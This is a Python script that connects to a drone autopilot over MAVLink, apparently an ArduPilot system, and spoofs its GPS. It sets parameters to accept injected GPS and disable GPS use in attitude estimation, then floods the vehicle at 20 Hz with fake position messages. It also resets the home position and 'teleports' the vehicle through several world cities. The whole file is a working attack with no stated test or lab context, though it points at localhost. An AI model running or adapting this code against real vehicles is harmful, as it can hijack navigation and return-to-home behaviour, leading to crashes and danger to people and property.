from pymavlink import mavutil
import time

def enhanced_gps_spoof_with_forcing():
    print("🚀 Enhanced GPS Spoofing with Position Forcing")
    master = mavutil.mavlink_connection('udpin:127.0.0.1:14550')
    master.wait_heartbeat()
    print(f"Connected! System {master.target_system}, Component {master.target_component}")
    
    # Force GPS parameters
    print("🔧 Configuring GPS parameters for maximum effectiveness...")
    
    # Set GPS to HIL mode
    master.mav.param_set_send(1, 1, b'GPS_TYPE', 14, mavutil.mavlink.MAV_PARAM_TYPE_INT32)
    master.mav.param_set_send(1, 1, b'GPS_TYPE2', 14, mavutil.mavlink.MAV_PARAM_TYPE_INT32)
    master.mav.param_set_send(1, 1, b'AHRS_GPS_USE', 0, mavutil.mavlink.MAV_PARAM_TYPE_INT32)
    
    time.sleep(2)
    
    locations = [
        (-35.400000, 149.200000, "Australia Target"),
        (40.7128, -74.0060, "New York City"),
        (51.5074, -0.1278, "London, UK"),
        (35.6762, 139.6503, "Tokyo, Japan"),
        (48.8566, 2.3522, "Paris, France")
    ]
    
    location_index = 0
    message_count = 0
    
    try:
        while True:
            lat, lon, name = locations[location_index]
            
            lat_int = int(lat * 1e7)
            lon_int = int(lon * 1e7)
            alt_mm = 100000
            
            current_time_us = int(time.time() * 1000000)
            current_time_ms = int(time.time() * 1000) & 0xFFFFFFFF
            
            # 1. HIL_GPS (Hardware-in-Loop GPS)
            master.mav.hil_gps_send(
                current_time_us, 3, lat_int, lon_int, alt_mm,
                100, 100, 0, 0, 0, 0, 0, 12, 0
            )
            
            # 2. GPS_RAW_INT 
            master.mav.gps_raw_int_send(
                current_time_us, 3, lat_int, lon_int, alt_mm,
                100, 100, 0, 0, 12
            )
            
            # 3. Force GLOBAL_POSITION_INT (this often drives the map)
            master.mav.global_position_int_send(
                current_time_ms, lat_int, lon_int, alt_mm, alt_mm,
                0, 0, 0, 65535
            )
            
            # 4. Set HOME position to spoof location
            if message_count % 50 == 0:
                master.mav.set_home_position_send(
                    1, lat_int, lon_int, alt_mm, 0, 0, 0,
                    [1.0, 0, 0, 0], 0, 0, current_time_us
                )
                print(f"🏠 HOME position set to: {name}")
            
            message_count += 3
            
            if message_count % 30 == 0:
                print(f"📍 {message_count} messages sent - GPS spoofed to: {name}")
                print(f"   Coordinates: {lat:.6f}, {lon:.6f}")
                print(f"   Map command: map center {lat} {lon}")
            
            # Switch location every 150 messages
            if message_count % 150 == 0:
                location_index = (location_index + 1) % len(locations)
                next_name = locations[location_index][2]
                print(f"🌍 TELEPORTING to: {next_name}")
            
            time.sleep(0.05)  # 20 Hz for aggressive spoofing
            
    except KeyboardInterrupt:
        print(f"\n🛑 Enhanced GPS spoofing stopped.")
        print(f"📊 Total messages sent: {message_count}")
        print("\n💡 To see changes on map, try in MAVProxy:")
        print("   map center 40.7128 -74.0060")
        print("   param set GPS_TYPE 14")

if __name__ == "__main__":
    enhanced_gps_spoof_with_forcing()
